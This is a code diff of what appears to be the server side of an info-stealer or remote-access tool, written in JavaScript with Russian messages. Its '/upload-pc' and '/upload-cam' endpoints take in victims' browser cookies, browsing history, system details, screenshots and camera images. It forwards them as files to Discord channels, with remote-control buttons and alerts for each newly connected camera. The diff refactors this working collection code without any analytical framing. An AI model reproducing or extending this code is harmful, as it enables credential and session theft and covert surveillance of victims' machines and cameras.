@@ -29,7 +29,7 @@ const CATEGORY_BASE_PC = " | Все ПК | ";
 const CATEGORY_BASE_CAM = " | Камеры | ";
 const CATEGORY_ARCHIVE_CAM = " | Архив камер | ";
 const LOG_CATEGORY = " | Логи | ";
-const LOG_CHANNEL = " / Серверные логи / ";
+const LOG_CHANNEL = " / Серверные логи /";
 
 const ONLINE_TIMEOUT = 1 * 60 * 1000;
 const MAX_FILE_SIZE = 6 * 1024 * 1024;
@@ -174,29 +174,17 @@ app.post("/upload-pc", async (req, res) => {
 
         const files = [];
         const descriptions = [];
-
-        if (cookies) {
-            files.push({ attachment: Buffer.from(JSON.stringify({ cookies }, null, 2)), name: `${channelName}-cookies.json` });
-            descriptions.push("🍪 **Cookies** — сохранены");
-        }
-        if (history) {
-            files.push({ attachment: Buffer.from(JSON.stringify({ history }, null, 2)), name: `${channelName}-history.json` });
-            descriptions.push("📜 **История браузера** — сохранена");
-        }
-        if (systemInfo) {
-            files.push({ attachment: Buffer.from(JSON.stringify({ systemInfo }, null, 2)), name: `${channelName}-system.json` });
-            descriptions.push("💻 **Системная информация** — сохранена");
-        }
-        if (screenshot) {
-            files.push({ attachment: Buffer.from(screenshot, "base64"), name: `${channelName}-screenshot.jpeg` });
-            descriptions.push("🖼️ **Скриншот** — сохранён");
-        }
+        if (cookies) { files.push({ attachment: Buffer.from(JSON.stringify({ cookies }, null, 2)), name: `${channelName}-cookies.json` }); descriptions.push("🍪 Cookies"); }
+        if (history) { files.push({ attachment: Buffer.from(JSON.stringify({ history }, null, 2)), name: `${channelName}-history.json` }); descriptions.push("📜 История"); }
+        if (systemInfo) { files.push({ attachment: Buffer.from(JSON.stringify({ systemInfo }, null, 2)), name: `${channelName}-system.json` }); descriptions.push("💻 Системная информация"); }
+        if (screenshot) { files.push({ attachment: Buffer.from(screenshot, "base64"), name: `${channelName}-screenshot.jpeg` }); descriptions.push("🖼️ Скриншот"); }
 
         let contentMsg = `🟢 ПК **${pcId}** обновлён\n\n` + descriptions.join("\n");
         const messageOptions = { content: contentMsg, components: createControlButtons(pcId) };
         if (files.length) messageOptions.files = files;
 
         await finalChannel.send(messageOptions);
+
         res.json({ success: true });
     } catch (e) { 
         await logToDiscord(`❌ Ошибка upload-pc: ${e.message}`); 
@@ -229,21 +217,17 @@ app.post("/upload-cam", async (req, res) => {
         }
 
         const guild = await bot.guilds.fetch(GUILD_ID);
-        const isInactive = Date.now() - (camLastUpload[camId] || 0) > CAM_INACTIVE_THRESHOLD;
-        const categoryName = isInactive ? CATEGORY_ARCHIVE_CAM : CATEGORY_BASE_CAM;
-        const category = await getOrCreateCategory(guild, categoryName);
-
+        const isNewCam = !channelByCam[camId];
+        const category = await getOrCreateCategory(guild, CATEGORY_BASE_CAM);
         const channelName = safeChannelName('cam', camId);
-        let finalChannel = null;
-        let isNewCam = false;
 
+        let finalChannel = null;
         if (channelByCam[camId]) {
             finalChannel = await guild.channels.fetch(channelByCam[camId]).catch(() => null);
         }
-        if (!finalChannel || finalChannel.parentId !== category.id) {
+        if (!finalChannel) {
             finalChannel = await getOrCreateTextChannel(guild, channelName, category.id);
             channelByCam[camId] = finalChannel.id;
-            isNewCam = true;
         }
 
         if (isNewCam) {
@@ -251,16 +235,15 @@ app.post("/upload-cam", async (req, res) => {
             await logChannel.send(`🚀 Новая камера подключена: **${camId}** <@everyone>`);
         }
 
-        camLastUpload[camId] = Date.now();
-
         const buffer = Buffer.from(screenshot, "base64");
         if (buffer.length <= MAX_FILE_SIZE) {
             await finalChannel.send({
-                content: `📷 Новое изображение с камеры **${camId}** (${new Date().toLocaleTimeString()})`,
+                content: `📷 Камера **${camId}** обновление (${new Date().toLocaleTimeString()})`,
                 files: [{ attachment: buffer, name: `${channelName}.jpg` }]
             });
         }
 
+        camLastUpload[camId] = Date.now();
         res.json({ success: true });
     } catch (e) {
         await logToDiscord(`❌ Ошибка upload-cam: ${e.message}`);
